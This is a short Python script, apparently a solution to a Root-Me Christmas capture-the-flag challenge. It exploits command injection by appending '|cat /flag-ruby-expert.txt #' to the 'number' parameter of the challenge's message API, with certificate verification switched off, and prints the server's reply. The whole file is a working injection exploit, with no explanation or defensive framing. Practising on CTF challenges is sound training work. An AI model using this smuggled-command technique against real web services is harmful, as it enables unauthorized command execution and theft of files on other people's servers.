import requests

cmd = 'cat /flag-ruby-expert.txt'

r = requests.get("https://day18.challenges.xmas.root-me.org/api/message?number=|" + cmd + " #", verify=False)

print(r.content.decode())
